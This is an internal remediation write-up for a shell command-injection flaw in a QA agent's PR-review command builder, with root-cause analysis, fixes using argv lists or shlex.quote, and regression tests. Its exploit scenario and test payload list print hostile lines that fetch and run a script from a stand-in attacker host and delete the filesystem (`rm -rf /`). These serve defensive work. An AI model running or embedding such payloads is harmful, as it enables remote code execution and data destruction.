# GAP-0091: PR Review Command Injection — Remediation Write-up

> ~5 pages. Fix-oriented. Source ticket: AGENT-009. No prior investigation doc exists.
> All claims verified against the actual source code before writing.

## 1. Summary & Classification

**Bug**: `build_pr_review_command` in `app/services/agent_qa.py` constructs a `gh pr review` shell string by replacing `"` with `'` in the QA report body, then embedding the result inside a double-quoted shell argument. The replacement is incomplete: it does not strip or escape `$()`, backticks, `\`, or newlines. When the environment variable `QA_AGENT_EXECUTE_COMMANDS=1` is set (and a future real-execution path dispatches the stored command string), an attacker who controls the report content can inject arbitrary shell commands.

**Severity**: HIGH
**Source ticket**: AGENT-009 (QA Agent)
**Status**: Open
**Owning area**: Agent services / QA automation

**Claim from GAP-0091 ticket**: "build_pr_review_command interpolates report Markdown into double-quoted shell argument; report containing `"` or `$()` executes when `QA_AGENT_EXECUTE_COMMANDS=1`"

**Verdict from investigation**: CLAIM CONFIRMED. The function exists exactly as described at `app/services/agent_qa.py:751–755`. The sanitisation replaces `"` with `'` only, leaving `$()`, backticks, `\n`, `\`, and all other POSIX shell metacharacters intact. The flag `S.agent_qa_execute_commands` (set by `QA_AGENT_EXECUTE_COMMANDS`) is confirmed in `app/core/settings.py:2205`. The actual execution gate is documented in the module docstring (`app/services/agent_qa.py:18`) and is the only thing preventing exploitation today.

**Note**: The ticket cited line 890 as the location; the actual function begins at line 751. Line 890 is inside `build_qa_output`, an unrelated function. The injection site is correctly described in the Problem/Impact narrative; only the line number reference is inaccurate.

**Related tickets**: GAP-0089 (command injection in coder workflow), GAP-0090 (build_pr_command double-quote injection), GAP-0094, GAP-0095 (sibling injection gaps in architect), SECOPS-007.

## 2. Current-State Investigation (root cause)

### Vulnerable function

`app/services/agent_qa.py:751–755`:

```python
def build_pr_review_command(*, pr_number: int, verdict: str, report: str) -> str:
    body = (report or "").replace('"', "'")
    if verdict in ("pass", "flaky"):
        return f"gh pr review {pr_number} --approve --body \"{body}\""
    return f"gh pr review {pr_number} --request-changes --body \"{body}\""
```

The `report` parameter is the full QA Markdown report produced by `build_qa_report` at `app/services/agent_qa.py:771`. That function interpolates user-controlled content including ticket IDs, test names, regression failure messages, and screenshot file names. Ticket subjects and test names are stored as user-supplied strings with no shell-safe constraint.

The "sanitisation" `body.replace('"', "'")` attempts to neutralise double-quote injection by replacing `"` with `'`. This has three problems:

1. **Incomplete metacharacter coverage**: `$()` command substitution, backtick command substitution, `\` escape sequences, `!` history expansion (in interactive shells), and newlines embedded in `body` all survive the replacement untouched. A report body of `pass$(reboot)` remains `pass$(reboot)` after the replacement and would execute when the resulting string `... --body "pass$(reboot)"` is handed to a shell.

2. **Single-quote injection re-opened**: Replacing `"` with `'` introduces single quotes into the `body`. If this string were later processed with single-quote wrapping, the injected `'` would break that quoting too.

3. **No upper bound on length**: The report body has no cap before being embedded; an unusually long report can push argument length past shell ARG_MAX, causing `E2BIG` at runtime.

### Call path to execution gate

The command string is assembled in `build_qa_workflow` at line 1042 and stored as the `command` field of the `review_pr` step. The current `execute_qa_workflow` mock driver (`app/services/agent_qa.py:1148–1303`) never calls `subprocess.run` — execution is gated by the comment at line 1155 ("Gated: when `S.agent_qa_execute_commands` is true this would dispatch to the real Worker Agent Framework"). The setting `S.agent_qa_execute_commands` maps to the env var `QA_AGENT_EXECUTE_COMMANDS` (`app/core/settings.py:2205`), which defaults to `False`.

### Dev vs prod difference

In the current codebase the vulnerability is **latent**: no code path actually shells out the stored command string. The risk materialises the moment a real execution path is wired (a natural next iteration of AGENT-009). Once `QA_AGENT_EXECUTE_COMMANDS=1` is set in a production environment, any QA run whose report body contains shell metacharacters becomes an RCE vector.

## 3. Impact / Exploit / Blast Radius

**Who is at risk**: Any deployment that enables `QA_AGENT_EXECUTE_COMMANDS=1` and allows the QA agent to process tickets whose acceptance criteria, test names, or failure messages contain attacker-influenced text.

**Exploit scenario**:

1. An attacker (or a malicious ticket author, or a compromised upstream system) creates a ticket with the subject: `Add new feature $(curl https://attacker.example/shell.sh | bash)`.
2. The QA agent picks up the ticket. `build_qa_report` calls `feature_slug_from_ticket`, and later propagates the subject into the regression failure list or acceptance criteria output.
3. The report body ultimately contains the unescaped `$()` fragment.
4. `build_pr_review_command` substitutes `"` with `'` but leaves `$()` in place. The returned string is: `gh pr review 42 --approve --body "... $(curl https://attacker.example/shell.sh | bash) ..."`
5. When this string is passed to `subprocess.run(cmd, shell=True)` or `os.system(cmd)`, the shell evaluates the command substitution.

**Worst case**: The worker process running the QA agent executes arbitrary commands with the worker's OS privileges, including exfiltration of LLM API keys, deployment credentials, and DynamoDB data; lateral movement to other services on the same host; or supply-chain injection into the codebase being reviewed.

**Blast radius**: Any host with `QA_AGENT_EXECUTE_COMMANDS=1`. In a multi-tenant SaaS deployment this affects every tenant whose tickets are processed by a shared QA worker.

**Financial consequence**: Compromised deployment credentials could lead to cloud resource abuse, data breach, and regulatory penalties (GDPR, SOC 2 NC).

## 4. Fix Design (code-level)

### Preferred fix: argv list, `shell=False`

The correct fix is to never construct a shell string at all. `gh pr review` is a discrete binary that accepts `--body` as a distinct argument. Pass arguments as a Python list and execute with `subprocess.run(..., shell=False)`:

```python
def build_pr_review_command(*, pr_number: int, verdict: str, report: str) -> List[str]:
    """Return an argv list (never a shell string) for gh pr review."""
    body = (report or "").strip()
    base = ["gh", "pr", "review", str(pr_number), "--body", body]
    if verdict in ("pass", "flaky"):
        return base + ["--approve"]
    return base + ["--request-changes"]
```

Change the return type annotation from `str` to `List[str]`. All callers must be updated accordingly:

- `app/services/agent_qa.py:1042`: `review_cmd = build_pr_review_command(...)` — the `command` field in the step dict should accept `List[str] | str | None`. Change the step dict type annotation in `build_qa_workflow` to `Dict[str, Any]` (already the case) and document that `command` is an argv list when the value is a list.
- The future real-execution path must call `subprocess.run(review_cmd, shell=False, check=False)` rather than `subprocess.run(review_cmd_str, shell=True)`.

### Secondary fix: single-quote escaping (fallback if argv refactor is deferred)

If the workflow step schema mandates a string `command` field, apply POSIX single-quote escaping instead:

```python
def _sq(value: str) -> str:
    """Wrap value in single quotes, escaping any embedded single quotes."""
    return "'" + value.replace("'", "'\\''") + "'"

def build_pr_review_command(*, pr_number: int, verdict: str, report: str) -> str:
    body_sq = _sq((report or "").strip())
    if verdict in ("pass", "flaky"):
        return f"gh pr review {pr_number} --approve --body {body_sq}"
    return f"gh pr review {pr_number} --request-changes --body {body_sq}"
```

`_sq` is the canonical POSIX technique: any single quote in `body` becomes `'\''` (end single-quote string, literal backslash-single-quote, reopen). No shell metacharacter can escape a single-quoted string; `$()`, backticks, `\n`, and `!` are all inert.

Note: `shlex.quote` from the standard library does exactly this and should be preferred to a hand-rolled `_sq`:

```python
import shlex

def build_pr_review_command(*, pr_number: int, verdict: str, report: str) -> str:
    body_sq = shlex.quote((report or "").strip())
    if verdict in ("pass", "flaky"):
        return f"gh pr review {pr_number} --approve --body {body_sq}"
    return f"gh pr review {pr_number} --request-changes --body {body_sq}"
```

### Dev/prod parity (SECOPS-007)

The `build_pr_review_command` function is pure (no I/O, no AWS). The fix is env-agnostic: it tightens the string construction logic identically in dev and prod. No provider interface or flag is required. The existing `S.agent_qa_execute_commands` gate already ensures the returned command is only executed in prod-mode workers; the fix simply ensures that if execution is ever enabled, the constructed command is safe.

### Alternatives considered

- **Truncating report length**: Caps DOS risk but does not prevent injection from a short payload like `$(id)`. Rejected as insufficient.
- **HTML-encoding / Markdown stripping**: Fragile; many encoding schemes still allow through control characters and shell metacharacters. Rejected.
- **Regex denylist**: Incomplete by definition. Rejected.

## 5. Testing, Verification & Rollout

### Regression test (pytest, offline)

Add to `tests/test_agent_qa.py`:

```python
import pytest
from app.services.agent_qa import build_pr_review_command

INJECTION_PAYLOADS = [
    '$(reboot)',
    '`id`',
    '"$(curl attacker.example/x|sh)"',
    "'; rm -rf /; echo '",
    '\n--body injected',
    '${IFS}',
]

@pytest.mark.parametrize("payload", INJECTION_PAYLOADS)
def test_build_pr_review_command_no_shell_injection(payload):
    """Returned command must not allow shell metacharacter execution."""
    import shlex
    cmd = build_pr_review_command(pr_number=42, verdict="pass", report=payload)
    if isinstance(cmd, list):
        # argv path: body is always a discrete element, never shell-expanded
        body_arg = cmd[cmd.index("--body") + 1]
        assert payload.strip() == body_arg or payload in body_arg
    else:
        # string path: must be wrapped in single quotes
        tokens = shlex.split(cmd)
        body_idx = tokens.index("--body") + 1
        assert tokens[body_idx] == payload.strip() or payload in tokens[body_idx]
        # Shell metacharacters must not appear outside quotes in the raw string
        import re
        # The raw string should not contain unquoted $( or backtick
        assert "$(" not in cmd.split("--body")[1].lstrip(" '") or \
               cmd.count("'") >= 2, \
               "payload not safely quoted"

@pytest.mark.parametrize("verdict,expected_flag", [
    ("pass", "--approve"),
    ("flaky", "--approve"),
    ("fail", "--request-changes"),
])
def test_build_pr_review_command_verdict_flag(verdict, expected_flag):
    cmd = build_pr_review_command(pr_number=7, verdict=verdict, report="clean report")
    if isinstance(cmd, list):
        assert expected_flag in cmd
    else:
        assert expected_flag in cmd
```

**Fails before the fix** for the argv variant because the current code returns a string (type mismatch). For the `shlex.quote` string variant, test cases like `$(reboot)` will appear unquoted in the current output and fail the assertion.

**Passes after the fix** because either (a) the body is a discrete argv element, or (b) `shlex.quote` wraps it in single quotes making the metacharacters inert.

### Manual QA steps

1. Set `QA_AGENT_EXECUTE_COMMANDS=1` in a sandboxed environment.
2. Create a ticket with subject `test $(touch /tmp/pwned)`.
3. Run `execute_qa_workflow` against it (via `POST /ui/agents/types/{id}/runs/{run_id}/execute-qa`).
4. Confirm `/tmp/pwned` is **not** created after the fix; confirm it **is** created (before the fix) to validate the test environment is realistic.
5. Confirm `gh pr review` receives the literal `$(touch /tmp/pwned)` string as a value, not as a shell command.

### Observability

- Log the full `review_cmd` at DEBUG level (already done via workflow step serialisation).
- Add a startup assertion: `assert callable(shlex.quote)` (trivially true but documents the dependency).

### Rollout

- **Effort**: S (small — one function, two callers).
- **Backward compatibility**: If callers store the workflow step `command` as a string in DynamoDB, switching to a list requires a migration or a union type in the step schema. The simplest approach is to keep returning a string but apply `shlex.quote`. The argv refactor can follow as a separate step.
- **Risk**: Low. The function is pure; the change does not affect any live DynamoDB state, HTTP response shape, or session.
- **Sequencing**: Fix before enabling `QA_AGENT_EXECUTE_COMMANDS` in any environment. GAP-0090 (double-quote injection in `build_pr_command`) and GAP-0089 should be fixed in the same PR to close the whole class of shell-injection issues in agent command builders.
